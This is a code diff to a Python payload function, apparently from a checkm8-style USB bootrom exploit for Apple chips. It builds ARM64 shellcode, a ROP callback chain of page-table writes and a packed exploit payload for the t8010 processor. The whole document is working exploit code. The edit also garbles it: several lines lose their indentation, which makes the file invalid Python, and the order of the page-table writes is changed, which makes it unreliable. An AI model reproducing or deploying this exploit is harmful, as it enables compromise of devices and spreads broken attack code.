@@ -309,7 +309,7 @@ def payload(cpid):
     assert len(t8004_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(t8004_handler) <= PAYLOAD_SIZE_ARMV7
     return t8004_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8004_shellcode)) + t8004_handler
-  if cpid == 0x8010:
+if cpid == 0x8010:
     constants_usb_t8010 = [
                0x1800B0000, # 1 - LOAD_ADDRESS
         0x6578656365786563, # 2 - EXEC_MAGIC
@@ -337,26 +337,26 @@ def payload(cpid):
     t8010_dmb                      = 0x100000478
     t8010_handle_interface_request = 0x10000DFB8
     t8010_callbacks = [
-      (t8010_dc_civac, 0x1800B0600),
-      (t8010_dmb, 0),
-      (t8010_enter_critical_section, 0),
-      (t8010_write_ttbr0, 0x1800A8000), # A custom pagetable we just set up
-      (t8010_tlbi, 0),
-      (0x1820B0610, 0),
-      (t8010_write_ttbr0, 0x1800A0000),
-      (t8010_tlbi, 0),
-      (t8010_exit_critical_section, 0),
-      (0x1800B0000, 0),
-      (t8010_write_ttbr0, 0x1800A0000), # Real pagetable
-      (t8010_tlbi, 0),
+        (t8010_dc_civac, 0x1800B0600),
+        (t8010_dmb, 0),
+        (t8010_enter_critical_section, 0),
+        (t8010_write_ttbr0, 0x1800B0000),
+        (t8010_tlbi, 0),
+        (0x1820B0610, 0),
+        (t8010_write_ttbr0, 0x1800A8000), # A custom pagetable we just set up
+        (t8010_tlbi, 0),
+        (t8010_exit_critical_section, 0),
+        (0x1800B0000, 0),
+        (t8010_write_ttbr0, 0x1800A0000), # Real pagetable
+        (t8010_tlbi, 0),
     ]
     t8010_handler = asm_arm64_x7_trampoline(t8010_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8010)[4:]
     t8010_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8010)
-    assert len(t8010_shellcode) <= PAYLOAD_OFFSET_ARM64
-    assert len(t8010_handler) <= PAYLOAD_SIZE_ARM64
-    t8010_shellcode = t8010_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8010_shellcode)) + t8010_handler
-    assert len(t8010_shellcode) <= 0x400
-    return struct.pack('<1024sQ504x2Q496s32x', t8010_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks)
+assert len(t8010_shellcode) <= PAYLOAD_OFFSET_ARM64
+assert len(t8010_handler) <= PAYLOAD_SIZE_ARM64
+t8010_shellcode = t8010_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8010_shellcode)) + t8010_handler
+assert len(t8010_shellcode) <= 0x400
+return struct.pack('<1024sQ504x2Q496s32x', t8010_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks)
   if cpid == 0x8011:
     constants_usb_t8011 = [
                0x1800B0000, # 1 - LOAD_ADDRESS
